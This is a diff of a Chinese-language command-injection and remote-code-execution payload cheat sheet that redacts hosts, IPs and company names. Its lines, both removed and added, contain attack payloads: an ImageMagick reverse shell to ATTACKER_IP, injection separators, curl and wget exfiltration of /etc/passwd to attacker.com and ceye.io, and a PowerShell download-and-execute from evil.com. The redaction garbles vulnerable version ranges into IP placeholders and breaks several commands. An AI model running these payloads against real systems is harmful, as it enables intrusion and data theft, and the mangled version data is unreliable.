@@ -32,7 +32,7 @@
 ```
 push graphic-context
 viewbox 0 0 640 480
-fill 'url(https://example.com/image.jpg"|bash -i >& /dev/tcp/ATTACKER_IP/8080 0>&1 &")'
+fill 'url(https://example.com/[已脱敏]"|bash -i >& /dev/tcp/ATTACKER_IP/8080 0>&1 &")'
 pop graphic-context
 ```
 
@@ -46,7 +46,7 @@ pop graphic-context
 
 **实战案例**：
 - wooyun-2016-0205171：人人网头像上传处，直接获取root shell
-- wooyun-2016-0214726：新浪站点，补丁绕过
+- wooyun-2016-0214726：某社交平台站点，补丁绕过
 - wooyun-2016-0205815：小咖秀APP头像上传
 
 **利用条件**：
@@ -64,7 +64,7 @@ pop graphic-context
 #EXTM3U
 #EXT-X-MEDIA-SEQUENCE:0
 #EXTINF:10.0,
-concat:http://attacker.dnslog.info
+concat:https://example.com/[已脱敏]
 #EXT-X-ENDLIST
 ```
 
@@ -127,7 +127,7 @@ http://target:8080/jmx-console/
 **实战案例**：
 - wooyun-2015-0166055：中石化WebLogic root权限
 - wooyun-2015-0163942：泛华保险WebLogic
-- wooyun-2015-0144418：中国电信JBoss
+- wooyun-2015-0144418：某运营商JBoss
 
 ---
 
@@ -179,11 +179,11 @@ system("ping -c 4 " . $ip);
 
 **POC**：
 ```
-ip=127.0.0.1;whoami
-ip=127.0.0.1|id
-ip=127.0.0.1`id`
-ip=127.0.0.1$(id)
-ip=127.0.0.1%0aid
+ip=[IP已脱敏];whoami
+ip=[IP已脱敏]|id
+ip=[IP已脱敏]`id`
+ip=[IP已脱敏]$(id)
+ip=[IP已脱敏]%0aid
 ```
 
 ---
@@ -207,15 +207,15 @@ ip=127.0.0.1%0aid
 #### 2.2.1 分号 `;`
 ```bash
 # 最常用，不受前命令执行结果影响
-ping 127.0.0.1; whoami; id
+ping [IP已脱敏]; whoami; id
 ```
 
 #### 2.2.2 管道符 `|`
 ```bash
 # 前面输出作为后面输入
-ping 127.0.0.1 | id
+ping [IP已脱敏] | id
 # 常见变形
-ping 127.0.0.1 || id  # 前面失败执行后面
+ping [IP已脱敏] || id  # 前面失败执行后面
 ```
 
 #### 2.2.3 命令替换
@@ -229,7 +229,7 @@ ping $(whoami)
 #### 2.2.4 逻辑运算符
 ```bash
 # && 前面成功才执行后面
-ping 127.0.0.1 && whoami
+ping [IP已脱敏] && whoami
 # || 前面失败才执行后面
 ping 不存在的地址 || whoami
 ```
@@ -393,7 +393,7 @@ ping `whoami`.xxxxx.ceye.io
 curl http://`whoami`.xxxxx.ceye.io
 
 # 完整数据外带
-curl http://xxxxx.ceye.io/`cat /etc/passwd | base64 | tr '\n' '-'`
+curl https://example.com/[已脱敏]`cat /etc/passwd | base64 | tr '\n' '-'`
 ```
 
 ### 4.3 HTTP外带
@@ -401,17 +401,17 @@ curl http://xxxxx.ceye.io/`cat /etc/passwd | base64 | tr '\n' '-'`
 **curl方式**：
 ```bash
 # GET请求带数据
-curl http://attacker.com/`whoami`
-curl http://attacker.com/?data=`cat /etc/passwd | base64`
+curl https://example.com/[已脱敏]`whoami`
+curl https://example.com/[已脱敏]`cat /etc/passwd | base64`
 
 # POST请求
-curl -X POST -d "data=$(cat /etc/passwd)" http://attacker.com/receive
+curl -X POST -d "data=$(cat /etc/passwd)" https://example.com/[已脱敏]
 ```
 
 **wget方式**：
 ```bash
-wget http://attacker.com/`whoami`
-wget http://attacker.com/?data=$(id)
+wget https://example.com/[已脱敏]`whoami`
+wget https://example.com/[已脱敏])
 ```
 
 ### 4.4 时间延迟检测
@@ -421,7 +421,7 @@ wget http://attacker.com/?data=$(id)
 sleep 5
 
 # ping延迟
-ping -c 5 127.0.0.1
+ping -c 5 [IP已脱敏]
 
 # 条件延迟
 if [ $(whoami) = "root" ]; then sleep 5; fi
@@ -469,11 +469,11 @@ id >> /var/www/html/log.txt
 | CVE编号 | 漏洞名称 | 影响版本 |
 |---------|---------|---------|
 | S2-001 | OGNL注入 | 2.0.0-2.0.8 |
-| S2-005 | OGNL注入 | 2.0.0-2.1.8.1 |
-| S2-009 | OGNL注入 | 2.1.0-2.3.1.1 |
-| S2-013 | URL重定向 | 2.0.0-2.3.14.1 |
+| S2-005 | OGNL注入 | 2.0.0-[IP已脱敏] |
+| S2-009 | OGNL注入 | 2.1.0-[IP已脱敏] |
+| S2-013 | URL重定向 | 2.0.0-[IP已脱敏] |
 | S2-016 | redirect/action | 2.0.0-2.3.15 |
-| S2-019 | 动态方法调用 | 2.0.0-2.3.15.1 |
+| S2-019 | 动态方法调用 | 2.0.0-[IP已脱敏] |
 | S2-032 | 动态方法调用 | 2.3.20-2.3.28 |
 | S2-045 | Content-Type | 2.3.5-2.3.31 |
 | S2-046 | Content-Disposition | 2.3.5-2.3.31 |
@@ -485,10 +485,10 @@ id >> /var/www/html/log.txt
 #### 5.2.2 WebLogic反序列化
 
 **影响版本**：
-- 10.3.6.0
-- 12.1.3.0
-- 12.2.1.2
-- 12.2.1.3
+- [IP已脱敏]
+- [IP已脱敏]
+- [IP已脱敏]
+- [IP已脱敏]
 
 **漏洞端口**：7001 (T3协议)
 
@@ -879,7 +879,7 @@ system('whoami || dir');  # || 前命令失败才执行
 
 # PowerShell绕过
 system('powershell -c "whoami"');
-system('powershell -c "IEX (New-Object Net.WebClient).DownloadString(\'http://evil.com/ps1\')"');
+system('powershell -c "IEX (New-Object Net.WebClient).DownloadString(\'https://example.com/[已脱敏]')"');
 ```
 
 #### 10.2.5 shell_exec() - 静默执行者
@@ -908,7 +908,7 @@ shell_exec('ping -c 1 ' . $_GET['ip']);
 shell_exec('whoami');
 
 // 无回显场景 - HTTP外带
-shell_exec('curl http://attacker.com/$(whoami)');
+shell_exec('curl https://example.com/[已脱敏])');
 
 // DNS外带
 shell_exec('ping $(whoami).ceye.io');
@@ -1009,7 +1009,7 @@ whoami | dir  # 管道
 ping `whoami`.xxxxx.ceye.io
 
 # 数据外带
-curl http://xxxxx.ceye.io/`cat /etc/passwd | base64 | tr '\n' '-'`
+curl https://example.com/[已脱敏]`cat /etc/passwd | base64 | tr '\n' '-'`
 
 # Windows
 ping %COMPUTERNAME%.xxxxx.ceye.io
@@ -1019,23 +1019,23 @@ nslookup %USERNAME%.xxxxx.ceye.io
 **HTTP外带**：
 ```bash
 # Linux
-curl http://attacker.com/$(whoami)
-wget http://attacker.com/?data=$(id)
+curl https://example.com/[已脱敏])
+wget https://example.com/[已脱敏])
 
 # Windows
-powershell -c "Invoke-WebRequest -Uri 'http://attacker.com/'$env:USERNAME"
-certutil -urlcache -split -f "http://attacker.com/$env:COMPUTERNAME" C:\test.txt
+powershell -c "Invoke-WebRequest -Uri 'https://example.com/[已脱敏]'$env:USERNAME"
+certutil -urlcache -split -f "https://example.com/[已脱敏]" C:\test.txt
 ```
 
 **时间延迟**：
 ```bash
 # Linux
 sleep 5
-ping -c 5 127.0.0.1
+ping -c 5 [IP已脱敏]
 
 # Windows
 timeout 5
-ping -n 6 127.0.0.1
+ping -n 6 [IP已脱敏]
 ```
 
 #### 10.3.5 文件写入Payload
@@ -1207,7 +1207,7 @@ chmod('/var/www/html/test.sh', 0755);
 **POC（使用工具）**：
 ```bash
 # 使用fcgi_exploit.py
-python fcgi_exploit.py -c '<?php system("whoami");?>' -p 9000 127.0.0.1 /var/www/html/index.php
+python fcgi_exploit.py -c '<?php system("whoami");?>' -p 9000 [IP已脱敏] /var/www/html/index.php
 ```
 
 #### 10.4.5 ImageMagick 绕过
@@ -1218,7 +1218,7 @@ python fcgi_exploit.py -c '<?php system("whoami");?>' -p 9000 127.0.0.1 /var/www
 ```
 push graphic-context
 viewbox 0 0 640 480
-fill 'url(https://example.com/image.jpg"|bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1 &")'
+fill 'url(https://example.com/[已脱敏]"|bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1 &")'
 pop graphic-context
 ```
 
@@ -1488,7 +1488,7 @@ $c('whoami');
 - [ ] `file_put_contents('/tmp/test.txt', 'content')` - 写文件
 
 **网络测试**：
-- [ ] `curl http://attacker.com/` - HTTP请求
+- [ ] `curl https://example.com/[已脱敏]` - HTTP请求
 - [ ] `gethostbyname('test.ceye.io')` - DNS查询
 - [ ] `fsockopen('tcp://attacker.com', 80)` - Socket连接
 
